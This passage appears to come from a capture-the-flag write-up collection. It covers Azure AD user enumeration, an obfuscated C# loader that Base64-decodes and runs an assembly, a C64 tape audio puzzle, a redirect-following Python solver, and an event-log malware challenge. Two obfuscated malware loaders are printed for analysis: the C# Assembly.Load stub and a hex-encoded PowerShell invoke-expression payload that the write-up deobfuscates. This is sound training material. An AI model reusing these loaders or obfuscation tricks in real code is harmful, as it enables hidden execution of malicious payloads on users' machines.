AlexW@4rhdc6.onmicrosoft.com            0ce655b4-3623-4931-ad67-7592e8c6ce9c
HuntressCTFAdmin@4rhdc6.onmicrosoft.com 183037f1-027d-4206-84af-95106f08e16c
HackMe@4rhdc6.onmicrosoft.com           32ee9aa5-dc31-4b36-9d38-e514ff8da818
JohannaL@4rhdc6.onmicrosoft.com         38e85aa3-f8c4-417f-b59b-8163f332640d
LynneR@4rhdc6.onmicrosoft.com           578075eb-5400-4fe7-a225-cd8e0f3242f8
HenriettaM@4rhdc6.onmicrosoft.com       6b5d422b-3317-4193-9f38-37b3c700789f
JoniS@4rhdc6.onmicrosoft.com            718bb614-ccf0-48f8-84a2-8df4f09efa14
AdeleV@4rhdc6.onmicrosoft.com           a2f01482-575c-46ae-802a-267392b0cd8f
DiegoS@4rhdc6.onmicrosoft.com           a3527d86-a02c-4cc4-af15-eb89a1825013
LidiaH@4rhdc6.onmicrosoft.com           ab658cc5-fe15-4a7e-8a87-8dda42818a27
NestorW@4rhdc6.onmicrosoft.com          c168db1f-588b-4746-aa22-44396fe83c30
PattiF@4rhdc6.onmicrosoft.com           d15033b7-6556-4bcd-8ec5-0c3f7ff7e9be
PradeepG@4rhdc6.onmicrosoft.com         e65bc282-d8ea-4018-a5b3-3e3f03cdec35
GradyA@4rhdc6.onmicrosoft.com           eec05309-74b1-4e89-a379-9e2199ba9826
MeganB@4rhdc6.onmicrosoft.com           ef935576-05f9-46fd-bf19-995d14926ea1
IsaiahL@4rhdc6.onmicrosoft.com          f1d16e98-cd61-41d8-afea-399b1a6e6323
MiriamG@4rhdc6.onmicrosoft.com          fee33a0e-c6cf-4a34-9ed6-6e4c7bf62521

PS /home/user> Get-AADIntUser -UserPrincipalName "PattiF@4rhdc6.onmicrosoft.com"

AlternateEmailAddresses                :
AlternateMobilePhones                  :
AlternativeSecurityIds                 :
BlockCredential                        : false
City                                   : Louisville
CloudExchangeRecipientDisplayType      : 1073741824
Country                                : United States
Department                             : Executive Management
DirSyncEnabled                         :
DirSyncProvisioningErrors              :
DisplayName                            : Patti Fernandez
Errors                                 :
Fax                                    :
FirstName                              : Patti
ImmutableId                            :
IndirectLicenseErrors                  :
IsBlackberryUser                       : false
IsLicensed                             : true
LastDirSyncTime                        :
LastName                               : Fernandez
LastPasswordChangeTimestamp            : 2023-09-20T20:54:57Z
LicenseAssignmentDetails               : LicenseAssignmentDetails
LicenseReconciliationNeeded            : false
Licenses                               : Licenses
LiveId                                 : 10032002F3B32527
MSExchRecipientTypeDetails             :
MSRtcSipDeploymentLocator              :
MSRtcSipPrimaryUserAddress             :
MobilePhone                            :
OathTokenMetadata                      :
ObjectId                               : d15033b7-6556-4bcd-8ec5-0c3f7ff7e9be
Office                                 : 15/1102
OverallProvisioningStatus              : PendingInput
PasswordNeverExpires                   :
PasswordResetNotRequiredDuringActivate :
PhoneNumber                            : flag{1e674f0dd1434f2bb3fe5d645b0f9cc3}
PortalSettings                         :
PostalCode                             : 40223
PreferredDataLocation                  :
PreferredLanguage                      : en-US
ProxyAddresses                         : ProxyAddresses
ReleaseTrack                           :
ServiceInformation                     : ServiceInformation
SignInName                             : PattiF@4rhdc6.onmicrosoft.com
SoftDeletionTimestamp                  :
State                                  : KY
StreetAddress                          : 9900 Corporate Campus Dr., Suite 3000
StrongAuthenticationMethods            :
StrongAuthenticationPhoneAppDetails    :
StrongAuthenticationProofupTime        :
StrongAuthenticationRequirements       :
StrongAuthenticationUserDetails        :
StrongPasswordRequired                 :
StsRefreshTokensValidFrom              : 2023-09-20T20:54:57Z
Title                                  : President
UsageLocation                          : US
UserLandingPageIdentifierForO365Shell  :
UserPrincipalName                      : PattiF@4rhdc6.onmicrosoft.com
UserThemeIdentifierForO365Shell        :
UserType                               : Member
ValidationStatus                       : Healthy
WhenCreated                            : 2023-09-16T10:24:34Z
```

## Babel

### Description

> It's babel! Just a bunch of gibberish, right?
>
> Download the file below.
>
> Attachments: babel

### Flag

flag{b6cfb6656ea0ac92849a06ead582456c}

### Solution

The attached `babel` file is obfuscated C# code.

```csharp
(snip)
string YKyumnAOcgLjvK = "lQwSYRxgfBHqNucMsVonkpaTiteDhbXzLPyEWImKAdjZFCOvJGrU";
Assembly smlpjtpFegEH = Assembly.Load(Convert.FromBase64String(zcfZIEShfvKnnsZ(pTIxJTjYJE, YKyumnAOcgLjvK)));
MethodInfo nxLTRAWINyst = smlpjtpFegEH.EntryPoint;
```

At the end, it Base64 decodes and call `Assembly.Load`.
To see what is happing, I append `Console.WriteLine(zcfZIEShfvKnnsZ(pTIxJTjYJE, YKyumnAOcgLjvK));` to print Base64 encoded string.

Edited `babel`:

```csharp
            // (snip)
            string YKyumnAOcgLjvK = "lQwSYRxgfBHqNucMsVonkpaTiteDhbXzLPyEWImKAdjZFCOvJGrU";
            Console.WriteLine(zcfZIEShfvKnnsZ(pTIxJTjYJE, YKyumnAOcgLjvK));
            // Assembly smlpjtpFegEH = Assembly.Load(Convert.FromBase64String(zcfZIEShfvKnnsZ(pTIxJTjYJE, YKyumnAOcgLjvK)));
            // MethodInfo nxLTRAWINyst = smlpjtpFegEH.EntryPoint;
            // nxLTRAWINyst.Invoke(smlpjtpFegEH.CreateInstance(nxLTRAWINyst.Name), null);
        }
    }
}
```

compile and run.

```console
root@kali:~/ctf/HuntressCTF# mcs babel.cs && mono babel.exe | base64 -d > tmp.dat

root@kali:~/ctf/HuntressCTF# file tmp.dat
tmp.dat: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows, 2 sections

root@kali:~/ctf/HuntressCTF# strings tmp.dat | grep flag
flag{b6cfb6656ea0ac92849a06ead582456c}
```

Base64 decoded string is PE32+ executable.
Got flag by using `strings` command.

## PRESS PLAY ON TAPE

### Description

> While walking home through a dark alley you find an archaic 1980s cassette tape. It has "PRESS PLAY ON TAPE" written on the label. You take it home and play it on your old tape deck. It sounds awful. The noise made you throw your headphones to the floor immedately. You snagged a recording of it for analysis.
>
> WARNING: The audio in this file is very loud and obnoxious. Please turn your volume way down before playing.
>
> Download the file(s) below.
>
> Attachments: pressplayontape.wav

### Flag

flag{32564872d760263d52929ce58cc40071}

### Solution

This solution is based on using 2 tools, [AudioTap](https://wav-prg.sourceforge.io/audiotap.html) and [FinalTAP](https://csdb.dk/release/?id=143638).

Step 1: AudioTap

1. Run audiotap.exe
1. Create a Tap file

   ![AudioTap](img/press_play_on_tape_AudioTap1.png)

1. Select pressplayontape.wav for wav to tap
1. Enter File name to save tap file

Step 2: FinalTAP

1. Run FinalTap.exe
1. File > Open and select tap file created in Step 1
1. Select `PRG Extraction` tab
1. Select `C64 ROM-TAPE DATA`

   ![FinalTAP](img/press_play_on_tape_FinalTAP1.png)

### References

- [1530USB](https://www.load64.com/1530usb/)

## Indirect Payload

### Description

> We saw this odd technique in a previous malware sample, where it would uncover it's next payload by... well, you'll see.
>
> Press the Start button in the top-right to begin this challenge.
>
> Connect with:
>
> <http://chal.ctf.games:30521>

### Flag

flag{448c05ab3e3a7d68e3509eb85e87206f}

### Solution

flag.py

```python
import requests
import re

s = requests.Session()
# s.proxies = {'http':'http://127.0.0.1:8080'}

BASE_URL = "http://chal.ctf.games:30521"

resp = s.get(f'{BASE_URL}/site/flag.php', allow_redirects=False)

flag = ""

while True:
    print(flag, end='\r', flush=True)
    path = resp.headers['Location']
    url = f"{BASE_URL}{path}"

    resp = s.get(url, allow_redirects=False)
    m = re.findall(r'character ([0-9]+) of the payload is ([0-9a-zA-Z\{\}]+)', resp.text)
    if len(m) == 1:
        flag += m[0][1]

        if m[0][1] == '}':
            print()
            print(flag)
            break
```

## Texas Chainsaw Massacre: Tokyo Drift

### Description

> Ugh! One of our users was trying to install a Texas Chainsaw Massacre video game, and installed malware instead. Our EDR detected a rogue process reading and writing events to the Application event log. Luckily, it killed the process and everything seems fine, but we don't know what it was doing in the event log.
>
> The EVTX file is attached. Are you able to find anything malicious?
>
> Archive password: infected
>
> Download the file(s) below.
>
> Attachments: ChainsawMassacre.zip

### Flag

flag{409537347c2fae01ef9826c2506ac660}

### Solution

Extracted ChainsawMassacre.zip, got `Application Logs.evtx` file.
Looking at this file by Event Viewer.

Found the following event:

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="MsiInstaller" />
  <EventID Qualifiers="0">1337</EventID>
  <Version>0</Version>
  <Level>4</Level>
  <Task>0</Task>
  <Opcode>0</Opcode>
  <Keywords>0x80000000000000</Keywords>
  <TimeCreated SystemTime="2023-10-10T16:02:47.0880233Z" />
  <EventRecordID>1785</EventRecordID>
  <Correlation />
  <Execution ProcessID="9488" ThreadID="0" />
  <Channel>Application</Channel>
  <Computer>DESKTOP-JU2PNRI</Computer>
  <Security />
  </System>
- <EventData>
  <Data>Windows Installer installed the product. Product Name: The Texas Chain Saw Massacre (1974). Product Version: 8.0.382.5. Product Language: English. Director: Tobe Hooper. Installation success or error status: 0.</Data>
  <Binary>2828272E2028205A5436454E763A436F4D537045635B342C32342C272B2732355D2D6A6F696E687836687836292820613654205A543628205365742D7661726961426C65206878364F665368783620687836687836296136542B2028205B537472694E67272B275D205B72454765585D3A3A6D41746368655328206136542029293432315D524168435B2C687836664B496878366543414C5065522D202039335D524168435B2C2938395D524168435B2B38345D524168435B2B39385D524168435B28204563616C506552432D202036335D524168435B2C6878366B776C6878364563616C506552432D20202968783629626878362B68783630596230596878362B6878366E694F6A2D5D35322C6878362B68783634322C6878362B272B27687836345B63656878362B687836706878362B687836534D6F433A566E6878362B687836656B776C2028206878362B6878362E20664B4920292028446E454F5444416878362B687836656878362B687836722E297D2029206878362B272B2768783669696373413A6878362B6878363A5D476E69644F634E6878362B687836652E6878362B687836546878362B6878367865746878362B6878362E6878362B6878364D45547379735B6878362B687836202C5F6B776878362B68272B2778366C20285245446878362B6878364165526D61657274532E6F272B27496878362B68783620746878362B68783643687836272B272B687836656A624F2D5768272B2778362B687836456E207B2048436145526F466878362B687836664B49292073534552704D272B276F43656878362B6878272B2736646878362B6878363A3A6878362B6878365D272B2765644F4D6878362B687836272B276E4F6973534572504D6F636878362B6878362E4E6F49535365726878362B687836704D4F632E6F695B2C20292062272B2730596878362B6878363D3D7744794434702B53272B27732F6C2F6878362B687836692B35477461744A4B79664E6A4F6878362B272B27687836336878362B687836336878362B68783634566878362B687836766A36775279525865317879317042306878362B6878364158564C4D674F77596878362B6878362F2F6878362B687836576F6D6878362B6878367A272B277A556878362B68783674426878362B68783673782F69653072565A376878362B68783678634C696F77574D4745566A6B374A4D6678566D75737A6878362B6878364F5433586B4B753954764F73726878362B68783662626878362B68783663626878362B68783647795A36632F67596878362B6878364E70696C6878362B687836424B3778356878362B687836506C636878362B687836387155794F6842596878362B6878365665636A4E4C573432596A4D38537774416878362B687836615238496878362B6878364F6878362B687836776878362B6878366D6878362B687836366878362B6878365577574E6D577A4377272B276878362B6878365672536878362B6878367237496878362B68783654326878362B6878366B364D6A314D756878362B6878364B6878362B68783654272B272F6F526878362B6878364F35424B4B3852334E68446878362B6878366F6D32416878362B6878364759706878362B68783679616878362B68783654614E673844416E654E6F65536A6878362B68272B27783675676B5442465463435061534830516A704679776878362B272B276878366151796878272B27362B6878364874505547272B276878272B27362B687836444C30424B336878362B68272B2778366C436C724841766878362B68272B27783634474F70564B6878362B687836554E6878362B6878366D477A494465726145766C7063272B276B433945476878362B6878366749616639366A536D53687836272B272B6878364D686878362B687836686878362B68783652664937326878362B6878366F487A556B44735A6F54356878362B6878366E6878362B68783663374D44385733315871272B274B6878362B68783664346462746878362B6878366274683152645369674561456878362B6878364A4E45524D4C557856272B276878362B6878364D4534504A74556878362B6878367453494A555A665A6878362B68783645456878362B687836416878362B6878364A735464445A4E626878362B687836305928676E69525453346878362B68783636657368272B2778362B68783661426D6F52463A3A5D745265766E4F6878362B687836435B5D4D416572747359724F6D654D2E4F692E6D45545359735B20284D6145726878362B687836746878362B687836734574414C6665442E4E4F6878362B687836497353272B276572506D6F272B27632E4F492E6D656878362B68783654735953687836272B272B687836206878362B687836207443656A624F2D57456878362B6878366E2028206878362828286E6F272B2749737365527058272B27652D656B6F766E69206136542C6878362E6878362C6878365269676874546F4C454674687836202920525963666F72456163687B5A54365F207D292B613654205A543628207356206878366F4673687836206878362068783629613654202920272920202D635245704C41434520285B634841725D39302B5B634841725D38342B5B634841725D3534292C5B634841725D3336202D7245506C41636527613654272C5B634841725D333420202D7245506C416365202027525963272C5B634841725D313234202D635245704C4143452020285B634841725D3130342B5B634841725D3132302B5B634841725D3534292C5B634841725D333929207C2E20282024764552626F5345707265466552656E43652E744F537472494E4728295B312C335D2B2778272D4A4F696E272729</Binary>
  </EventData>
  </Event>
```

Unhex binary value, got obfuscated PowerShell Script:

```ps1
(('. ( ZT6ENv:CoMSpEc[4,24,'+'25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg'+'] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+'+'hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+'+'hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+h'+'x6l (REDhx6+hx6AeRmaertS.o'+'Ihx6+hx6 thx6+hx6Chx6'+'+hx6ejbO-Wh'+'x6+hx6En { HCaERoFhx6+hx6fKI) sSERpM'+'oCehx6+hx'+'6dhx6+hx6::hx6+hx6]'+'edOMhx6+hx6'+'nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) b'+'0Yhx6+hx6==wDyD4p+S'+'s/l/hx6+hx6i+5GtatJKyfNjOhx6+'+'hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6z'+'zUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCw'+'hx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T'+'/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+h'+'x6ugkTBFTcCPaSH0QjpFywhx6+'+'hx6aQyhx'+'6+hx6HtPUG'+'hx'+'6+hx6DL0BK3hx6+h'+'x6lClrHAvhx6+h'+'x64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpc'+'kC9EGhx6+hx6gIaf96jSmShx6'+'+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31Xq'+'Khx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxV'+'hx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+hx60Y(gniRTS4hx6+hx66esh'+'x6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsS'+'erPmo'+'c.OI.mehx6+hx6TsYShx6'+'+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((no'+'IsseRpX'+'e-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')
```

Looking at generated string:

```powershell
PS C:\Users\root> (('. ( ZT6ENv:CoMSpEc[4,24,' + '25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg' + '] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+' + 'hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+' + 'hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+h' + 'x6l (REDhx6+hx6AeRmaertS.o' + 'Ihx6+hx6 thx6+hx6Chx6' + '+hx6ejbO-Wh' + 'x6+hx6En { HCaERoFhx6+hx6fKI) sSERpM' + 'oCehx6+hx' + '6dhx6+hx6::hx6+hx6]' + 'edOMhx6+hx6' + 'nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) b' + '0Yhx6+hx6==wDyD4p+S' + 's/l/hx6+hx6i+5GtatJKyfNjOhx6+' + 'hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6z' + 'zUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCw' + 'hx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T' + '/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+h' + 'x6ugkTBFTcCPaSH0QjpFywhx6+' + 'hx6aQyhx' + '6+hx6HtPUG' + 'hx' + '6+hx6DL0BK3hx6+h' + 'x6lClrHAvhx6+h' + 'x64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpc' + 'kC9EGhx6+hx6gIaf96jSmShx6' + '+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31Xq' + 'Khx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxV' + 'hx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+hx60Y(gniRTS4hx6+hx66esh' + 'x6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsS' + 'erPmo' + 'c.OI.mehx6+hx6TsYShx6' + '+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((no' + 'IsseRpX' + 'e-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ') -cREpLACE ([cHAr]90 + [cHAr]84 + [cHAr]54), [cHAr]36 -rEPlAce 'a6T', [cHAr]34 -rEPlAce 'RYc', [cHAr]124 -cREpLACE ([cHAr]104 + [cHAr]120 + [cHAr]54), [cHAr]39)
. ( $ENv:CoMSpEc[4,24,25]-join'')( " $( Set-variaBle 'OfS' '')"+ ( [StriNg] [rEGeX]::mAtcheS( " ))421]RAhC[,'fKI'eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,'kwl'EcalPeRC-  )')b'+'0Yb0Y'+'niOj-]52,'+'42,'+'4[ce'+'p'+'SMoC:Vn'+'ekwl ( '+'. fKI ) (DnEOTDA'+'e'+'r.)} ) '+'iicsA:'+':]GnidOcN'+'e.'+'T'+'xet'+'.'+'METsys['+' ,_kw'+'l (RED'+'AeRmaertS.oI'+' t'+'C'+'ejbO-W'+'En { HCaERoF'+'fKI) sSERpMoCe'+'d'+'::'+']edOM'+'nOisSErPMoc'+'.NoISSer'+'pMOc.oi[, ) b0Y'+'==wDyD4p+Ss/l/'+'i+5GtatJKyfNjO'+'3'+'3'+'4V'+'vj6wRyRXe1xy1pB0'+'AXVLMgOwY'+'//'+'Wom'+'zzU'+'tB'+'sx/ie0rVZ7'+'xcLiowWMGEVjk7JMfxVmusz'+'OT3XkKu9TvOsr'+'bb'+'cb'+'GyZ6c/gY'+'Npil'+'BK7x5'+'Plc'+'8qUyOhBY'+'VecjNLW42YjM8SwtA'+'aR8I'+'O'+'w'+'m'+'6'+'UwWNmWzCw'+'VrS'+'r7I'+'T2'+'k6Mj1Mu'+'K'+'T/oR'+'O5BKK8R3NhD'+'om2A'+'GYp'+'ya'+'TaNg8DAneNoeSj'+'ugkTBFTcCPaSH0QjpFyw'+'aQy'+'HtPUG'+'DL0BK3'+'lClrHAv'+'4GOpVK'+'UN'+'mGzIDeraEvlpckC9EG'+'gIaf96jSmS'+'Mh'+'h'+'RfI72'+'oHzUkDsZoT5'+'n'+'c7MD8W31XqK'+'d4dbt'+'bth1RdSigEaE'+'JNERMLUxV'+'ME4PJtU'+'tSIJUZfZ'+'EE'+'A'+'JsTdDZNb'+'0Y(gniRTS4'+'6es'+'aBmoRF::]tRevnO'+'C[]MAertsYrOmeM.Oi.mETSYs[ (MaEr'+'t'+'sEtALfeD.NO'+'IsSerPmoc.OI.me'+'TsYS'+' '+' tCejbO-WE'+'n ( '(((noIsseRpXe-ekovni ",'.','RightToLEFt' ) |forEach{$_ })+" $( sV 'oFs' ' ')" )
PS C:\Users\root> ( " $( Set-variaBle 'OfS' '')"+ ( [StriNg] [rEGeX]::mAtcheS( " ))421]RAhC[,'fKI'eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,'kwl'EcalPeRC-  )')b'+'0Yb0Y'+'niOj-]52,'+'42,'+'4[ce'+'p'+'SMoC:Vn'+'ekwl ( '+'. fKI ) (DnEOTDA'+'e'+'r.)} ) '+'iicsA:'+':]GnidOcN'+'e.'+'T'+'xet'+'.'+'METsys['+' ,_kw'+'l (RED'+'AeRmaertS.oI'+' t'+'C'+'ejbO-W'+'En { HCaERoF'+'fKI) sSERpMoCe'+'d'+'::'+']edOM'+'nOisSErPMoc'+'.NoISSer'+'pMOc.oi[, ) b0Y'+'==wDyD4p+Ss/l/'+'i+5GtatJKyfNjO'+'3'+'3'+'4V'+'vj6wRyRXe1xy1pB0'+'AXVLMgOwY'+'//'+'Wom'+'zzU'+'tB'+'sx/ie0rVZ7'+'xcLiowWMGEVjk7JMfxVmusz'+'OT3XkKu9TvOsr'+'bb'+'cb'+'GyZ6c/gY'+'Npil'+'BK7x5'+'Plc'+'8qUyOhBY'+'VecjNLW42YjM8SwtA'+'aR8I'+'O'+'w'+'m'+'6'+'UwWNmWzCw'+'VrS'+'r7I'+'T2'+'k6Mj1Mu'+'K'+'T/oR'+'O5BKK8R3NhD'+'om2A'+'GYp'+'ya'+'TaNg8DAneNoeSj'+'ugkTBFTcCPaSH0QjpFyw'+'aQy'+'HtPUG'+'DL0BK3'+'lClrHAv'+'4GOpVK'+'UN'+'mGzIDeraEvlpckC9EG'+'gIaf96jSmS'+'Mh'+'h'+'RfI72'+'oHzUkDsZoT5'+'n'+'c7MD8W31XqK'+'d4dbt'+'bth1RdSigEaE'+'JNERMLUxV'+'ME4PJtU'+'tSIJUZfZ'+'EE'+'A'+'JsTdDZNb'+'0Y(gniRTS4'+'6es'+'aBmoRF::]tRevnO'+'C[]MAertsYrOmeM.Oi.mETSYs[ (MaEr'+'t'+'sEtALfeD.NO'+'IsSerPmoc.OI.me'+'TsYS'+' '+' tCejbO-WE'+'n ( '(((noIsseRpXe-ekovni ",'.','RightToLEFt' ) |forEach{$_ })+" $( sV 'oFs' ' ')" )
  invoke-eXpRessIon(((' ( n'+'EW-ObjeCt '+' '+'SYsT'+'em.IO.comPreSsI'+'ON.DefLAtEs'+'t'+'rEaM( [sYSTEm.iO.MemOrYstreAM][C'+'OnveRt]::FRomBa'+'se6'+'4STRing(Y0'+'bNZDdTsJ'+'A'+'EE'+'ZfZUJISt'+'UtJP4EM'+'VxULMRENJ'+'EaEgiSdR1htb'+'tbd4d'+'KqX13W8DM7c'+'n'+'5ToZsDkUzHo'+'27IfR'+'h'+'hM'+'SmSj69faIg'+'GE9CkcplvEareDIzGm'+'NU'+'KVpOG4'+'vAHrlCl'+'3KB0LD'+'GUPtH'+'yQa'+'wyFpjQ0HSaPCcTFBTkgu'+'jSeoNenAD8gNaT'+'ay'+'pYG'+'A2mo'+'DhN3R8KKB5O'+'Ro/T'+'K'+'uM1jM6k'+'2T'+'I7r'+'SrV'+'wCzWmNWwU'+'6'+'m'+'w'+'O'+'I8Ra'+'AtwS8MjY24WLNjceV'+'YBhOyUq8'+'clP'+'5x7KB'+'lipN'+'Yg/c6ZyG'+'bc'+'bb'+'rsOvT9uKkX3TO'+'zsumVxfMJ7kjVEGMWwoiLcx'+'7ZVr0ei/xs'+'Bt'+'Uzz'+'moW'+'//'+'YwOgMLVXA'+'0Bp1yx1eXRyRw6jv'+'V4'+'3'+'3'+'OjNfyKJtatG5+i'+'/l/sS+p4DyDw=='+'Y0b ) ,[io.cOMp'+'reSSIoN.'+'coMPrESsiOn'+'MOde]'+'::'+'d'+'eCoMpRESs )IKf'+'FoREaCH { nE'+'W-Obje'+'C'+'t '+'Io.StreamReA'+'DER( l'+'wk_, '+'[sysTEM'+'.'+'tex'+'T'+'.e'+'NcOdinG]:'+':Ascii'+' ) }).r'+'e'+'ADTOEnD( ) IKf .'+' ( lwke'+'nV:CoMS'+'p'+'ec[4'+',24'+',25]-jOin'+'Y0bY0'+'b)')  -CRePlacE'lwk',[ChAR]36  -CRePlacE ([ChAR]89+[ChAR]48+[ChAR]98),[ChAR]39  -RePLACe'IKf',[ChAR]124))
PS C:\Users\root> ((' ( n'+'EW-ObjeCt '+' '+'SYsT'+'em.IO.comPreSsI'+'ON.DefLAtEs'+'t'+'rEaM( [sYSTEm.iO.MemOrYstreAM][C'+'OnveRt]::FRomBa'+'se6'+'4STRing(Y0'+'bNZDdTsJ'+'A'+'EE'+'ZfZUJISt'+'UtJP4EM'+'VxULMRENJ'+'EaEgiSdR1htb'+'tbd4d'+'KqX13W8DM7c'+'n'+'5ToZsDkUzHo'+'27IfR'+'h'+'hM'+'SmSj69faIg'+'GE9CkcplvEareDIzGm'+'NU'+'KVpOG4'+'vAHrlCl'+'3KB0LD'+'GUPtH'+'yQa'+'wyFpjQ0HSaPCcTFBTkgu'+'jSeoNenAD8gNaT'+'ay'+'pYG'+'A2mo'+'DhN3R8KKB5O'+'Ro/T'+'K'+'uM1jM6k'+'2T'+'I7r'+'SrV'+'wCzWmNWwU'+'6'+'m'+'w'+'O'+'I8Ra'+'AtwS8MjY24WLNjceV'+'YBhOyUq8'+'clP'+'5x7KB'+'lipN'+'Yg/c6ZyG'+'bc'+'bb'+'rsOvT9uKkX3TO'+'zsumVxfMJ7kjVEGMWwoiLcx'+'7ZVr0ei/xs'+'Bt'+'Uzz'+'moW'+'//'+'YwOgMLVXA'+'0Bp1yx1eXRyRw6jv'+'V4'+'3'+'3'+'OjNfyKJtatG5+i'+'/l/sS+p4DyDw=='+'Y0b ) ,[io.cOMp'+'reSSIoN.'+'coMPrESsiOn'+'MOde]'+'::'+'d'+'eCoMpRESs )IKf'+'FoREaCH { nE'+'W-Obje'+'C'+'t '+'Io.StreamReA'+'DER( l'+'wk_, '+'[sysTEM'+'.'+'tex'+'T'+'.e'+'NcOdinG]:'+':Ascii'+' ) }).r'+'e'+'ADTOEnD( ) IKf .'+' ( lwke'+'nV:CoMS'+'p'+'ec[4'+',24'+',25]-jOin'+'Y0bY0'+'b)')  -CRePlacE'lwk',[ChAR]36  -CRePlacE ([ChAR]89+[ChAR]48+[ChAR]98),[ChAR]39  -RePLACe'IKf',[ChAR]124)
